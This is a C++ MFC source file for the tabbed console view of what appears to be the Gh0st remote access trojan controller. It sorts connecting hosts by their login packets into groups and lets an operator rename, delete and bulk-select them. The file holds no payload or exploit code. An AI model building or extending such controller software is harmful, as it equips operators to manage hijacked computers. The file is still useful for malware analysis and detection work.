// Gh0stView.cpp : implementation of the CGh0stView class
//

#include "stdafx.h"
#include "Gh0st.h"

#include "Gh0stDoc.h"
#include "Gh0stView.h"
#include "PcView.h"
#include "InputDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
#define IDC_TABCONTROL 100

CGh0stView* g_pTabView;
CXTPTabManagerItem* pRightItem;
/////////////////////////////////////////////////////////////////////////////
// CGh0stView

IMPLEMENT_DYNCREATE(CGh0stView, CView)

BEGIN_MESSAGE_MAP(CGh0stView, CView)
	//{{AFX_MSG_MAP(CGh0stView)
	ON_WM_CREATE()
	ON_WM_ERASEBKGND()
	ON_WM_CONTEXTMENU()
	ON_WM_SIZE()
	ON_COMMAND(ID_MENUITEM_GROUP_ADD, OnMenuitemGroupAdd)
	ON_COMMAND(ID_MENUITEM_GROUP_DEL, OnMenuitemGroupDel)
	ON_COMMAND(ID_MENUITEM_CHANGE, OnMenuitemChange)
	ON_COMMAND(ID_MENUITEM_SELECT_NUM, OnMenuitemSelectNum)
	//}}AFX_MSG_MAP
	ON_NOTIFY(TCN_SELCHANGE, IDC_TABCONTROL, OnSelectedChanged)
	ON_MESSAGE(WM_ADDFINDGROUP, OnAddFindGroup)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stView construction/destruction

CGh0stView::CGh0stView()
{
	// TODO: add construction code here
	g_pTabView = this;
}

CGh0stView::~CGh0stView()
{
}

BOOL CGh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style |= LVS_REPORT;
	return CView::PreCreateWindow(cs);
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView drawing

void CGh0stView::OnDraw(CDC* pDC)
{
	CGh0stDoc* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView diagnostics

#ifdef _DEBUG
void CGh0stView::AssertValid() const
{
	CXTPListView::AssertValid();
}

void CGh0stView::Dump(CDumpContext& dc) const
{
	CXTPListView::Dump(dc);
}

CGh0stDoc* CGh0stView::GetDocument() // non-debug version is inline
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	return (CGh0stDoc*)m_pDocument;
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CGh0stView message handlers

int CGh0stView::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CView::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	// TODO: Add your specialized creation code here
	m_wndTabControl.Create(WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, IDC_TABCONTROL);
	m_wndTabControl.GetPaintManager()->SetAppearance(xtpTabAppearancePropertyPageFlat); 
	m_wndTabControl.GetPaintManager()->m_bHotTracking = TRUE;	
	m_wndTabControl.SetPosition(xtpTabPositionBottom);
	m_wndTabControl.SetColor(xtpTabColorOffice2003);
	
	m_wndTabControl.GetPaintManager()->DisableLunaColors(TRUE);
	
	AddGroup(_T("Default(0)"));
	m_wndTabControl.SetCurSel(0);
	return 0;
}

BOOL CGh0stView::AddGroup( LPCTSTR lpszTitle )
{
	BOOL Result = AddView(RUNTIME_CLASS(CPcView), lpszTitle);
	return Result;
}


BOOL CGh0stView::AddView(CRuntimeClass* pViewClass, LPCTSTR lpszTitle)
{
	CCreateContext contextT;
	contextT.m_pCurrentDoc     = GetDocument();
	contextT.m_pNewViewClass   = pViewClass;
	contextT.m_pNewDocTemplate = GetDocument()->GetDocTemplate();
	
	CWnd* pWnd;
	TRY
	{
		pWnd = (CWnd*)pViewClass->CreateObject();
		if (pWnd == NULL)
		{
			AfxThrowMemoryException();
		}
	}
	CATCH_ALL(e)
	{
		TRACE0( "Out of memory creating a view.\n" );
		// Note: DELETE_EXCEPTION(e) not required
		return FALSE;
	}
	END_CATCH_ALL
		
	DWORD dwStyle = AFX_WS_DEFAULT_VIEW;
	dwStyle &= ~WS_BORDER;
	
	int nTab = m_wndTabControl.GetItemCount();
	
	// Create with the right size (wrong position)
	CRect rect(0,0,0,0);
	if (!pWnd->Create(NULL, NULL, dwStyle,
		rect, &m_wndTabControl, (AFX_IDW_PANE_FIRST + nTab), &contextT))
	{
		TRACE0( "Warning: couldn't create client tab for view.\n" );
		// pWnd will be cleaned up by PostNcDestroy
		return NULL;
	}
	m_wndTabControl.InsertItem(nTab, lpszTitle, pWnd->GetSafeHwnd());
	
	pWnd->SetOwner(this);

	return TRUE;
}

void CGh0stView::UpdateDocTitle()
{
	GetDocument()->UpdateFrameCounts();
}

void CGh0stView::OnSelectedChanged(NMHDR* pNMHDR, LRESULT* pResult)
{
	UNUSED_ALWAYS(pNMHDR);
	*pResult = 0;
	
	UpdateDocTitle();
	
	CFrameWnd* pFrame = GetParentFrame();
	CView* pView = DYNAMIC_DOWNCAST(CView, CWnd::FromHandle(m_wndTabControl.GetSelectedItem()->GetHandle()));
	ASSERT_KINDOF(CView, pView);
	
	pFrame->SetActiveView(pView);
}

LRESULT CGh0stView::OnAddFindGroup(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	
	if (pContext == NULL)
		return -1;
	try
	{	
		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;
		
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		
		BOOL bFind=false;
		CString strGroupName, strTemp;
		
		int nTabs = m_wndTabControl.GetItemCount();
		for ( int i = 0; i < nTabs; i++)
		{
			strTemp = m_wndTabControl.GetItem(i)->GetCaption();
			int n = strTemp.ReverseFind('(');
			if( n > 0 )
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}
			
			if ( strlen(LoginInfo->UpGroup) == NULL )
			{
				lstrcpy( LoginInfo->UpGroup, "Default" );//默认分组
			}
			
			if (strGroupName == LoginInfo->UpGroup)
			{	
				bFind = true;
				CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(i)->GetHandle()));
				pView->PostMessage( WM_ADDTOLIST, 0, (LPARAM)pContext );
				break;
			}
		}
		if (!bFind)
		{	
			strGroupName.Format( "%s(1)", LoginInfo->UpGroup );
			AddGroup( strGroupName );
			CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(nTabs)->GetHandle()));
			pView->OnInitialUpdate();
			pView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext );
		}
	}
	catch (...){}
	
	return 0;
}

BOOL CGh0stView::UpDateNumber()
{	
	CString strGroupName, strTemp;
	int nTabs = m_wndTabControl.GetItemCount();
	
	for ( int i = 0; i < nTabs; i++ )
	{	
		strTemp = m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		
		CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(i)->GetHandle()));
		
		strTemp.Format( "%s(%d)", strGroupName, pView->m_pListCtrl->GetItemCount() );
		m_wndTabControl.GetItem(i)->SetCaption(strTemp);
	}
	return TRUE;
}

BOOL CGh0stView::OnEraseBkgnd(CDC* pDC) 
{
	// TODO: Add your message handler code here and/or call default
	return TRUE;
//	return CView::OnEraseBkgnd(pDC);
}

void CGh0stView::OnContextMenu(CWnd* pWnd, CPoint point) 
{
	// TODO: Add your message handler code here
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_TAB);
	CMenu*	pM = popup.GetSubMenu(0);
	CRect rc;
	CPoint	p;
	GetCursorPos(&p);
	GetWindowRect(&rc);
	point.x = point.x - rc.left;
	point.y = point.y - rc.top;
	
	int nItem = m_wndTabControl.GetItemCount();
	for (int i = 0; i < nItem; i++)
	{	
		if (m_wndTabControl.GetItem(i)->GetRect().PtInRect(point))
		{	
			pRightItem = m_wndTabControl.GetItem(i);
			CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);
			break;
		}
	}
}

void CGh0stView::OnSize(UINT nType, int cx, int cy) 
{
	CView::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (m_wndTabControl.GetSafeHwnd())
	{
		m_wndTabControl.MoveWindow(0, 0, cx , cy);
	}
}

void CGh0stView::OnMenuitemGroupAdd() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
	CString strGroup, strGroupName, strTemp;
	dlg.Init(_T("添加新分组"), _T("请输入新分组的名称："),this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)
		return;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	int i=0;
	for ( i = 0; i < nTabs; i++ )
	{
		strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		if (dlg.m_str == strGroupName)
		{
			AfxMessageBox(_T("已存在该分组"));
			return;
		}
	}
	strGroup.Format(_T("%s(0)"), dlg.m_str);
	AddGroup(strGroup);
	CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(nTabs)->GetHandle()));
	pView->OnInitialUpdate();
}

void CGh0stView::OnMenuitemGroupDel() 
{
	// TODO: Add your command handler code here
	CString strGroupName, strTemp;
	
	strTemp = pRightItem->GetCaption();
	int n = strTemp.ReverseFind('(');
	if ( n > 0 )
	{
		strGroupName = strTemp.Left(n);
	}
	else
	{
		strGroupName = strTemp;
	}
	
	if( strGroupName == _T("Default"))
	{
		AfxMessageBox(_T("默认分组不允许删除"));
		return;
	}
	CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(pRightItem->GetHandle()));
	if (pView->m_pListCtrl->GetItemCount())
	{
		AfxMessageBox(_T("分组内存在主机不可删除"));
		return;
	}

	pRightItem->Remove();
}

void CGh0stView::OnMenuitemChange() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
	dlg.Init(_T("修改分组"), _T("请输入分组的新名称："),this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)
		return;

	CString strGroup, strGroupName, strTemp;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	int i=0;
	for ( i = 0; i < nTabs; i++ )
	{
		strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		if (dlg.m_str == strGroupName)
		{
			AfxMessageBox(_T("已存在该分组"));
			return;
		}
	}
	if( strGroupName == _T("Default"))
	{
		AfxMessageBox(_T("默认分组名不允许占用"));
		return;
	}

	CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(pRightItem->GetHandle()));
	
	strGroup.Format(_T("%s(%d)"), dlg.m_str,pView->m_pListCtrl->GetItemCount());
	pRightItem->SetCaption(strGroup);
}

void CGh0stView::OnMenuitemSelectNum() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
	dlg.Init(_T("选择所选目录下指定数目的主机"), _T("要选择多少主机:"),this,TRUE,"100");
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)
		return;

	CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(pRightItem->GetHandle()));
	pView->SetFocus();
	for (int i = 0; i < atoi(dlg.m_str); i++)   
	{   
		pView->m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		pView->m_pListCtrl->SetCheck(i,TRUE);
	}

}
